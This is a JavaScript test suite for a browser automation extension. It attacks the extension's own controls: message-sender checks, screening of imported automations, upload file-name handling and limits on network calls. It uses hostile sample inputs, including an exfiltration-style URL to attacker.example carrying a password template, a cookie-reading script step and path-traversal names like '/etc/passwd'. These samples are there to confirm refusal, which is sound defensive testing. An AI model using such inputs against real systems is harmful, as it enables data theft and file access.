/**
 * Security tests: attack the controls, do not merely assert they exist.
 *
 * Each test attempts a bypass. A test that only checks "the function exists" proves nothing; these drive
 * the real code with hostile input and assert the refusal.
 */
import { describe, it, expect, beforeEach, vi } from 'vitest';

// ---------------------------------------------------------------------------------------------
// a chrome mock, including a message bus so a message can be sent "as" a given sender
// ---------------------------------------------------------------------------------------------

function makeChrome() {
  const local = {};
  const session = {};
  const alarms = new Map();
  const listeners = { message: [] };

  const area = (store) => ({
    get(keys, cb) {
      if (keys === null || keys === undefined) return cb({ ...store });
      let out = {};
      if (typeof keys === 'string') {
        if (keys in store) out[keys] = store[keys];
      } else if (Array.isArray(keys)) {
        for (const k of keys) if (k in store) out[k] = store[k];
      } else if (typeof keys === 'object') {
        for (const [k, def] of Object.entries(keys)) out[k] = k in store ? store[k] : def;
      }
      cb(out);
    },
    set(items, cb) { Object.assign(store, JSON.parse(JSON.stringify(items))); cb?.(); },
    remove(keys, cb) { for (const k of [].concat(keys)) delete store[k]; cb?.(); },
    clear(cb) { for (const k of Object.keys(store)) delete store[k]; cb?.(); },
  });

  return {
    _stores: { local, session },
    _alarms: alarms,
    _listeners: listeners,
    storage: { local: area(local), session: area(session) },
    runtime: {
      lastError: undefined,
      id: 'our-extension-id',
      getManifest: () => ({ version: '1.0.0', manifest_version: 3 }),
      getURL: (p) => `chrome-extension://our-extension-id/${p}`,
      sendMessage: vi.fn(async () => ({ ok: true })),
      onMessage: { addListener: (fn) => listeners.message.push(fn) },
      onInstalled: { addListener: () => {} },
      onStartup: { addListener: () => {} },
    },
    alarms: {
      create: (name, info) => alarms.set(name, { name, scheduledTime: info?.when ?? Date.now() + 60_000, ...info }),
      getAll: async () => [...alarms.values()],
      clear: async (n) => alarms.delete(n),
      onAlarm: { addListener: () => {} },
    },
    tabs: {
      query: vi.fn(async () => []),
      get: vi.fn(async () => ({ id: 1, url: 'https://example.com', status: 'complete' })),
      create: vi.fn(async () => ({ id: 2 })),
      update: vi.fn(async () => ({ id: 1 })),
      sendMessage: vi.fn(async () => ({ ok: true })),
    },
    scripting: { executeScript: vi.fn(async () => []) },
    notifications: { create: vi.fn(async () => 'n1') },
    downloads: { download: vi.fn(async () => 1) },
    action: {
      setBadgeText: vi.fn(async () => {}),
      setBadgeBackgroundColor: vi.fn(async () => {}),
      onClicked: { addListener: () => {} },
    },
    commands: { onCommand: { addListener: () => {} } },
    sidePanel: { setPanelBehavior: vi.fn(async () => {}), open: vi.fn(async () => {}) },
  };
}

/**
 * Deliver a message to the registered listener as a specific sender, and return the response.
 *
 * This is how the sender check is actually exercised: the listener is called with a sender object shaped
 * like a page content script, or like an extension page, exactly as Chrome would.
 */
function deliver(chromeMock, msg, sender) {
  const listener = chromeMock._listeners.message[0];
  if (!listener) throw new Error('no message listener registered');
  return new Promise((resolve) => {
    let settled = false;
    const done = (r) => {
      if (!settled) {
        settled = true;
        resolve(r);
      }
    };
    const returned = listener(msg, sender, done);
    // a listener that handles asynchronously returns true; give it a moment
    setTimeout(() => done(undefined), 250);
    // a listener that returns false is not handling it at all
    if (returned === false) done({ handled: false });
  });
}

/**
 * Sender shapes copied from what Chrome actually provides, captured with scripts/probe-sender.mjs.
 *
 * The first version of these tests used `{id}` alone for an extension page, which does not occur: a real
 * extension page has BOTH a tab and a chrome-extension:// url. The tests passed and the panel broke. These
 * shapes are the measured ones.
 */
const EXTENSION_PAGE_SENDER = {
  id: 'our-extension-id',
  tab: { id: 1462188064, url: 'chrome-extension://our-extension-id/panel.html' },
  url: 'chrome-extension://our-extension-id/panel.html',
  origin: 'chrome-extension://our-extension-id',
};
const CONTENT_SCRIPT_SENDER = {
  id: 'our-extension-id',
  tab: { id: 1462188065, url: 'https://evil.example.com/' },
  url: 'https://evil.example.com/',
  origin: 'https://evil.example.com',
};
const UNKNOWN_SENDER = { id: 'someone-else' };
const FOREIGN_EXTENSION_SENDER = {
  id: 'someone-else',
  url: 'chrome-extension://someone-else/page.html',
};
const NO_URL_SENDER = { id: 'our-extension-id' };

/**
 * The service worker's own messages. It has no tab of its own (it acts on a tab it names by id), and its
 * url is its extension page. Used for the direction worker -> content script.
 */
const WORKER_SENDER = {
  id: 'our-extension-id',
  url: 'chrome-extension://our-extension-id/background.js',
  origin: 'chrome-extension://our-extension-id',
};

let chromeMock;

beforeEach(() => {
  chromeMock = makeChrome();
  globalThis.chrome = chromeMock;
  vi.resetModules();
});

// ---------------------------------------------------------------------------------------------

describe('background message handler — sender classification', () => {
  const load = async () => {
    await import('../src/background/service-worker.js');
    return chromeMock;
  };

  it('accepts an extension page and answers it', async () => {
    await load();
    const res = await deliver(chromeMock, { type: 'get-settings' }, EXTENSION_PAGE_SENDER);
    expect(res?.ok).toBe(true);
    expect(res?.settings).toBeTruthy();
  });

  it('refuses an unknown sender outright', async () => {
    await load();
    const res = await deliver(chromeMock, { type: 'get-settings' }, UNKNOWN_SENDER);
    expect(res?.ok).toBe(false);
    expect(res?.error).toMatch(/unrecognised message sender/);
  });

  it('refuses a sender with no id at all', async () => {
    await load();
    const res = await deliver(chromeMock, { type: 'get-settings' }, {});
    expect(res?.ok).toBe(false);
  });

  it('refuses a different extension', async () => {
    await load();
    const res = await deliver(chromeMock, { type: 'get-settings' }, FOREIGN_EXTENSION_SENDER);
    expect(res?.ok).toBe(false);
    expect(res?.error).toMatch(/unrecognised/);
  });

  it('treats our own id with no url as an internal caller', async () => {
    // this is the shape of the worker's own alarm handler and of an injected script
    await load();
    const res = await deliver(chromeMock, { type: 'get-settings' }, NO_URL_SENDER);
    expect(res?.ok).toBe(true);
  });

  it('classifies a real extension page as an extension page, not as a content script', async () => {
    // the regression that a live browser caught: the panel has BOTH a tab and an extension url
    await load();
    const res = await deliver(chromeMock, { type: 'list-automations' }, EXTENSION_PAGE_SENDER);
    expect(res?.ok).toBe(true);
    expect(res?.error ?? '').not.toMatch(/a page cannot send/);
  });

  // The important cases: a page-side context must not reach the powerful messages.
  const FORBIDDEN_FOR_A_PAGE = [
    'start-run',
    'stop-run',
    'save-automation',
    'delete-automation',
    'duplicate-automation',
    'save-settings',
    'clear-runs',
    'import-all',
    'export-all',
    'store-data-rows',
    'add-upload-file',
    'read-file-for-upload',
    'cancel-alarms',
    'schedule-one',
    'diagnostics',
    'list-automations',
    'list-runs',
    'get-settings',
    'reschedule',
  ];

  for (const type of FORBIDDEN_FOR_A_PAGE) {
    it(`refuses "${type}" from a content script`, async () => {
      await load();
      const res = await deliver(chromeMock, { type }, CONTENT_SCRIPT_SENDER);
      expect(res?.ok).toBe(false);
      expect(res?.error).toMatch(/a page cannot send/);
    });
  }

  const ALLOWED_FOR_A_PAGE = ['content-ready', 'element-picked', 'element-pick-cancelled', 'run-status'];

  for (const type of ALLOWED_FOR_A_PAGE) {
    it(`allows "${type}" from a content script`, async () => {
      await load();
      const res = await deliver(chromeMock, { type }, CONTENT_SCRIPT_SENDER);
      expect(res?.error ?? '').not.toMatch(/a page cannot send/);
    });
  }

  it('ignores a message with no type', async () => {
    await load();
    const listener = chromeMock._listeners.message[0];
    expect(listener({}, EXTENSION_PAGE_SENDER, () => {})).toBe(false);
    expect(listener(null, EXTENSION_PAGE_SENDER, () => {})).toBe(false);
    expect(listener({ type: 42 }, EXTENSION_PAGE_SENDER, () => {})).toBe(false);
  });

  it('does not leak stored data in a refusal', async () => {
    // Seed storage with distinctive values, then confirm none of them comes back in the refusal. The
    // refusal does echo the message TYPE the caller supplied, which tells the caller nothing it did not
    // already know - the question that matters is whether real data escapes.
    chromeMock._stores.local.automations = [
      { id: 'secret-id', name: 'MARKSECRETNAME', steps: [{ id: 's', kind: 'reload' }] },
    ];
    chromeMock._stores.local.settings = { theme: 'MARKSECRETTHEME' };
    await load();

    for (const msg of [
      { type: 'delete-automation', id: 'secret-id' },
      { type: 'get-settings' },
      { type: 'list-automations' },
      { type: 'export-all' },
    ]) {
      const res = await deliver(chromeMock, msg, CONTENT_SCRIPT_SENDER);
      const body = JSON.stringify(res ?? {});
      expect(body).not.toContain('MARKSECRETNAME');
      expect(body).not.toContain('MARKSECRETTHEME');
      expect(body).not.toContain('secret-id');
    }
  });
});

// ---------------------------------------------------------------------------------------------

describe('content script listener — sender', () => {
  /**
   * The content script registers its listener on import, so unknown message types are exercised rather
   * than the whole page-action surface. jsdom provides `document`, which the module touches at import.
   */
  const load = async () => {
    await import('../src/content/content.js');
    return chromeMock;
  };

  it('rejects a sender that is not the extension', async () => {
    await load();
    const listener = chromeMock._listeners.message[0];
    const handled = listener({ type: 'perform-step', step: { kind: 'click' } }, UNKNOWN_SENDER, () => {});
    expect(handled).toBe(false);
  });

  it('rejects a sender whose url is a web page (page code reaching the listener)', async () => {
    await load();
    const listener = chromeMock._listeners.message[0];
    const handled = listener({ type: 'perform-step', step: { kind: 'click' } }, CONTENT_SCRIPT_SENDER, () => {});
    expect(handled).toBe(false);
  });

  it('accepts the worker, whose sender carries an extension url', async () => {
    // This is the direction that broke in a live browser: a guard requiring the absence of `sender.tab`
    // rejected the worker and every page action failed with "the page gave no answer".
    await load();
    const listener = chromeMock._listeners.message[0];
    let answered = null;
    const handled = listener({ type: 'ping' }, WORKER_SENDER, (r) => { answered = r; });
    expect(handled).toBe(true);
    expect(answered?.ok).toBe(true);
  });

  it('accepts an extension page sender too, since it is inside the extension', async () => {
    await load();
    const listener = chromeMock._listeners.message[0];
    const handled = listener({ type: 'ping' }, EXTENSION_PAGE_SENDER, () => {});
    expect(handled).toBe(true);
  });

  it('ignores a message with no type', async () => {
    await load();
    const listener = chromeMock._listeners.message[0];
    expect(listener({}, CONTENT_SCRIPT_SENDER, () => {})).toBe(false);
  });
});

// ---------------------------------------------------------------------------------------------

describe('import — hostile automation files', () => {
  const load = () => import('../src/background/storage.js');

  const withSteps = (steps, name = 'From a file') => ({
    format: 'autoflow-export',
    version: 1,
    automations: [{ id: `x${Math.random()}`, name, steps, schedule: { kind: 'manual' }, enabled: true }],
  });

  it('holds back a script step unless scripts are explicitly allowed', async () => {
    const s = await load();
    const report = await s.importAll(withSteps([
      { id: 's1', kind: 'runScript', code: 'document.cookie' },
    ]));
    expect(report.imported).toBe(0);
    expect(report.skipped).toHaveLength(1);
    expect(report.skipped[0].reason).toMatch(/script step/);
    expect(report.concerns.some((c) => c.severity === 'high')).toBe(true);
  });

  it('imports the same file when the caller allows scripts', async () => {
    const s = await load();
    const report = await s.importAll(withSteps([
      { id: 's1', kind: 'runScript', code: 'return 1' },
    ]), { allowScripts: true });
    expect(report.imported).toBe(1);
  });

  it('flags a script hidden inside a loop', async () => {
    const s = await load();
    const report = await s.importAll(withSteps([
      { id: 'l', kind: 'loop', loopType: 'count', count: 3, steps: [{ id: 'inner', kind: 'runScript', code: 'x' }] },
    ]));
    expect(report.imported).toBe(0);
    expect(report.concerns.some((c) => c.kind === 'runScript')).toBe(true);
  });

  it('flags a script hidden inside an if branch', async () => {
    const s = await load();
    const report = await s.importAll(withSteps([
      { id: 'b', kind: 'if', condition: { source: 'text', comparator: 'exists' },
        then: [{ id: 't', kind: 'runScript', code: 'x' }], else: [] },
    ]));
    expect(report.imported).toBe(0);
  });

  it('flags a script hidden in an else branch', async () => {
    const s = await load();
    const report = await s.importAll(withSteps([
      { id: 'b', kind: 'if', condition: { source: 'text', comparator: 'exists' },
        then: [], else: [{ id: 'e', kind: 'runScript', code: 'x' }] },
    ]));
    expect(report.imported).toBe(0);
  });

  it('flags an unknown step kind', async () => {
    const s = await load();
    const report = await s.importAll(withSteps([{ id: 's1', kind: 'somethingInvented' }]), { allowScripts: true });
    expect(report.concerns.some((c) => /unrecognised step kind/.test(c.detail))).toBe(true);
  });

  it('flags a goto whose URL is built from a template', async () => {
    const s = await load();
    const report = await s.importAll(withSteps([
      { id: 'g', kind: 'goto', url: 'https://attacker.example/steal?d=${password}' },
    ]), { allowScripts: true });
    expect(report.concerns.some((c) => /template/.test(c.detail))).toBe(true);
  });

  it('rejects a step list deep enough to be a denial of service', async () => {
    const s = await load();
    // build a deeply nested loop chain
    let inner = [{ id: 'leaf', kind: 'wait', ms: 1 }];
    for (let i = 0; i < 40; i++) {
      inner = [{ id: `l${i}`, kind: 'loop', loopType: 'count', count: 1, steps: inner }];
    }
    const report = await s.importAll(withSteps(inner), { allowScripts: true });
    // either it imported (and stayed bounded) or it was skipped - it must not hang or throw
    expect(report.imported + report.skipped.length).toBe(1);
  });

  it('rejects a step with no kind', async () => {
    const s = await load();
    const report = await s.importAll(withSteps([{ id: 's1' }]), { allowScripts: true });
    expect(report.skipped).toHaveLength(1);
    expect(report.skipped[0].reason).toMatch(/no kind/);
  });

  it('rejects a non-object entry', async () => {
    const s = await load();
    const report = await s.importAll({ automations: ['just a string', 42] });
    expect(report.skipped).toHaveLength(2);
    expect(report.imported).toBe(0);
  });

  it('reports the concerns for a dry run without importing', async () => {
    const s = await load();
    const concerns = s.auditImportedAutomation({
      name: 'x', steps: [{ id: 'a', kind: 'runScript', code: 'x' }],
    });
    expect(concerns).toHaveLength(1);
    expect(concerns[0].severity).toBe('high');
  });

  it('does not report concerns for an ordinary automation', async () => {
    const s = await load();
    const concerns = s.auditImportedAutomation({
      name: 'x',
      steps: [{ id: 'a', kind: 'click', finder: { strategy: 'css', selector: '#go' } }],
    });
    expect(concerns).toEqual([]);
  });

  it('exports a document that declares whether it carries scripts', async () => {
    const s = await load();
    await s.saveAutomation({
      id: 'a1', name: 'with script', enabled: true, schedule: { kind: 'manual' },
      steps: [{ id: 's', kind: 'runScript', code: 'x' }],
    });
    const doc = await s.exportAll();
    expect(doc.containsScripts).toBe(true);
    expect(doc.concerns.some((c) => c.kind === 'runScript')).toBe(true);
  });
});

// ---------------------------------------------------------------------------------------------

describe('upload files — path handling', () => {
  const load = async () => {
    const mod = await import('../src/background/service-worker.js');
    return { mod, chrome: chromeMock };
  };

  it('refuses a file name containing a path separator', async () => {
    await load();
    for (const name of ['../secret', 'a/b.txt', '..\\win.txt', '/etc/passwd']) {
      const res = await deliver(chromeMock, { type: 'read-file-for-upload', name }, EXTENSION_PAGE_SENDER);
      expect(res?.ok).toBe(false);
    }
  });

  it('refuses a name that was never added', async () => {
    await load();
    const res = await deliver(chromeMock, { type: 'read-file-for-upload', name: 'never-added.txt' }, EXTENSION_PAGE_SENDER);
    expect(res?.ok).toBe(false);
    expect(res?.error).toMatch(/no uploaded file/);
  });

  it('accepts a data URL and rejects anything else', async () => {
    await load();
    const good = await deliver(chromeMock, {
      type: 'add-upload-file', name: 'doc.txt', dataUrl: 'data:text/plain;base64,aGVsbG8=',
    }, EXTENSION_PAGE_SENDER);
    expect(good?.ok).toBe(true);

    const bad = await deliver(chromeMock, {
      type: 'add-upload-file', name: 'doc2.txt', dataUrl: 'https://attacker.example/x',
    }, EXTENSION_PAGE_SENDER);
    expect(bad?.ok).toBe(false);
    expect(bad?.error).toMatch(/base64 data URL/);
  });

  it('rejects an oversized file', async () => {
    await load();
    const huge = `data:text/plain;base64,${'A'.repeat(13 * 1024 * 1024)}`;
    const res = await deliver(chromeMock, { type: 'add-upload-file', name: 'big.bin', dataUrl: huge }, EXTENSION_PAGE_SENDER);
    expect(res?.ok).toBe(false);
    expect(res?.error).toMatch(/larger than/);
  });
});

// ---------------------------------------------------------------------------------------------

/**
 * Network egress: exactly ONE call, and it is auditable.
 *
 * The previous assertion here was "the source contains no fetch at all". That was true and is no longer: the
 * clock check needs one HEAD request to read a server's `Date` header, which is the only way to detect that the
 * machine's clock is seconds off. Weakening the test to allow it would have thrown away the property it was
 * protecting, so it is replaced with narrower claims that are each checkable:
 *
 *   - there is exactly ONE call site for each of fetch/XHR/WebSocket/sendBeacon
 *   - it is the clock measurement, in the service worker
 *   - the request is HEAD: no body can be sent, so no page content can be exfiltrated through it
 *   - credentials are omitted, so the extension sends no cookies
 *   - only the `Date` header is read from the response
 *   - the URL must be http(s) and comes from the automation's own target
 *
 * That is a stronger position than "no network at all", because it says what the one call can and cannot do.
 */
describe('network egress: one auditable call', () => {
  it('there is exactly one fetch call site, in the clock measurement', async () => {
    const { readdir, readFile } = await import('node:fs/promises');
    const path = await import('node:path');
    const rootDir = path.resolve(process.cwd(), 'src');
    const walk = async (dir) => {
      const out = [];
      for (const e of await readdir(dir, { withFileTypes: true })) {
        const full = path.join(dir, e.name);
        if (e.isDirectory()) out.push(...(await walk(full)));
        else if (e.name.endsWith('.js')) out.push(full);
      }
      return out;
    };
    const files = await walk(rootDir);
    const callSites = [];
    for (const f of files) {
      const text = await readFile(f, 'utf8');
      for (const m of text.matchAll(/(?<![.\w])fetch\s*\(/g)) {
        callSites.push({ file: path.relative(rootDir, f), index: m.index });
      }
    }
    expect(callSites).toHaveLength(1);
    expect(callSites[0].file).toBe(path.join('background', 'service-worker.js'));
  });

  it('the one request cannot carry data: HEAD, no credentials, no body', async () => {
    const { readFile } = await import('node:fs/promises');
    const text = await readFile('src/background/service-worker.js', 'utf8');
    const at = text.indexOf('fetch(url');
    expect(at).toBeGreaterThan(-1);
    const around = text.slice(Math.max(0, at - 200), at + 400);
    expect(around).toMatch(/method:\s*'HEAD'/);
    expect(around).toMatch(/credentials:\s*'omit'/);
    expect(around).not.toMatch(/body\s*:/);
    // and it reads only the Date header
    expect(around).toMatch(/headers\.get\('date'\)/);
  });

  it('the url must be http(s), so it cannot be a data: or blob: channel', async () => {
    const { readFile } = await import('node:fs/promises');
    const text = await readFile('src/background/service-worker.js', 'utf8');
    // the guard as written in the handler: only http(s) is accepted, so a data:/blob:/file: URL is refused
    expect(text).toContain('!/^https?:/i.test(url)');
    expect(text).toContain('a http(s) url is required');
  });

  it('a page cannot trigger the measurement: it is not on the content-script allowlist', async () => {
    const { readFile } = await import('node:fs/promises');
    const text = await readFile('src/background/service-worker.js', 'utf8');
    const m = text.match(/const CONTENT_SCRIPT_MESSAGES = new Set\(\[([^\]]*)\]/);
    expect(m).toBeTruthy();
    expect(m[1]).not.toContain('measure-clock-offset');
  });

  it('there is no XHR, WebSocket or sendBeacon anywhere in the source', async () => {
    const { readdir, readFile } = await import('node:fs/promises');
    const path = await import('node:path');
    const rootDir = path.resolve(process.cwd(), 'src');

    const walk = async (dir) => {
      const out = [];
      for (const e of await readdir(dir, { withFileTypes: true })) {
        const full = path.join(dir, e.name);
        if (e.isDirectory()) out.push(...(await walk(full)));
        else if (e.name.endsWith('.js')) out.push(full);
      }
      return out;
    };

    const files = await walk(rootDir);
    const offenders = [];
    for (const f of files) {
      const text = await readFile(f, 'utf8');
      // strip comments so a comment that names the API is not a false positive
      const code = text.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
      for (const [label, rx] of [
        // `fetch` is deliberately NOT in this list any more: the clock check needs exactly one, and the test
        // above pins it to one call site with HEAD, no credentials and only the Date header read. Listing it
        // here as forbidden would either fail on the audited call or force that test to be weakened.
        ['XMLHttpRequest', /XMLHttpRequest/],
        ['WebSocket', /new\s+WebSocket/],
        ['EventSource', /new\s+EventSource/],
        ['sendBeacon', /sendBeacon/],
      ]) {
        if (rx.test(code)) offenders.push(`${path.relative(rootDir, f)}: ${label}`);
      }
    }
    expect(offenders).toEqual([]);
  });

  it('the source contains no eval or new Function', async () => {
    const { readdir, readFile } = await import('node:fs/promises');
    const path = await import('node:path');
    const rootDir = path.resolve(process.cwd(), 'src');

    const walk = async (dir) => {
      const out = [];
      for (const e of await readdir(dir, { withFileTypes: true })) {
        const full = path.join(dir, e.name);
        if (e.isDirectory()) out.push(...(await walk(full)));
        else if (e.name.endsWith('.js')) out.push(full);
      }
      return out;
    };

    const offenders = [];
    for (const f of await walk(rootDir)) {
      const text = await readFile(f, 'utf8');
      const code = text.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
      if (/\beval\s*\(/.test(code)) offenders.push(`${path.relative(rootDir, f)}: eval`);
      if (/new\s+Function\s*\(/.test(code)) offenders.push(`${path.relative(rootDir, f)}: new Function`);
    }
    // NOTE: runScript builds a <script> element for the PAGE's world. That is a deliberate feature and it
    // is not an eval of extension-privileged state, but it is the one place code is executed, so this
    // assertion documents that no OTHER place does it.
    expect(offenders).toEqual([]);
  });

  it('no innerHTML assignment remains in the UI', async () => {
    const { readdir, readFile } = await import('node:fs/promises');
    const path = await import('node:path');
    const rootDir = path.resolve(process.cwd(), 'src/ui');

    const walk = async (dir) => {
      const out = [];
      for (const e of await readdir(dir, { withFileTypes: true })) {
        const full = path.join(dir, e.name);
        if (e.isDirectory()) out.push(...(await walk(full)));
        else if (e.name.endsWith('.js')) out.push(full);
      }
      return out;
    };

    const offenders = [];
    for (const f of await walk(rootDir)) {
      const text = await readFile(f, 'utf8');
      const code = text.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
      if (/\.(inner|outer)HTML\s*=/.test(code)) offenders.push(path.relative(rootDir, f));
    }
    expect(offenders).toEqual([]);
  });
});
// ---------------------------------------------------------------------------------------------
// The import path, end to end.
//
// These exist because an independent reviewer reported that `importAll` "accepts an allowScripts flag but
// never consults it, and nothing in the import path blocks a flagged step". That was wrong about the
// enforcement - it is at storage.js:479, below the region the packet showed, and there was already a test
// for it - but it was RIGHT that the message-type surface was worth pinning. These tests close the gap
// between "the audit returns concerns" and "the import actually refuses", which is the difference the
// reviewer could not see.
// ---------------------------------------------------------------------------------------------
describe('import — the audit verdict is enforced, not merely reported', () => {
  async function load() {
    vi.resetModules();
    const mod = await import('../src/background/storage.js');
    return mod;
  }

  const makeDoc = (steps) => ({
    format: 'autoflow-export',
    version: 1,
    automations: [{
      id: 'imp-1', name: 'from a friend', steps,
      schedule: { kind: 'manual' }, enabled: true,
    }],
  });

  it('importAll REFUSES an automation carrying a script step, and names it in skipped[]', async () => {
    const s = await load();
    const report = await s.importAll(makeDoc([
      { id: 's1', kind: 'click', finder: { strategy: 'css', selector: '#a' } },
      { id: 's2', kind: 'runScript', code: 'steal()' },
    ]));

    // the enforcement, not just the audit: nothing was saved
    expect(report.imported).toBe(0);
    expect(report.skipped).toHaveLength(1);
    expect(report.skipped[0].name).toBe('from a friend');
    expect(report.skipped[0].reason).toMatch(/script step/);
    expect(report.concerns.some((c) => c.severity === 'high')).toBe(true);

    // and it really is not in storage afterwards
    const stored = await s.listAutomations();
    expect(stored.map((a) => a.id)).not.toContain('imp-1');
  });

  it('imports the same automation when the caller explicitly allows scripts', async () => {
    const s = await load();
    const report = await s.importAll(makeDoc([
      { id: 's1', kind: 'runScript', code: 'ok()' },
    ]), { allowScripts: true });
    expect(report.imported).toBe(1);
    expect(report.skipped).toHaveLength(0);
    const stored = await s.listAutomations();
    expect(stored.map((a) => a.id)).toContain('imp-1');
  });

  it('a script step buried in a loop or a branch is still found', async () => {
    const s = await load();
    for (const bury of [
      [{ id: 'l', kind: 'loop', loopType: 'count', count: 2, steps: [{ id: 'x', kind: 'runScript', code: 'x()' }] }],
      [{ id: 'i', kind: 'if', condition: { source: 'text', comparator: 'eq', value: 'y' },
         then: [{ id: 'x', kind: 'runScript', code: 'x()' }] }],
      [{ id: 'f', kind: 'forEach', loopType: 'forEach',
         steps: [{ id: 'x', kind: 'runScript', code: 'x()' }] }],
    ]) {
      const report = await s.importAll(makeDoc(bury));
      expect(report.imported, `buried in ${bury[0].kind}`).toBe(0);
      expect(report.skipped).toHaveLength(1);
    }
  });
});
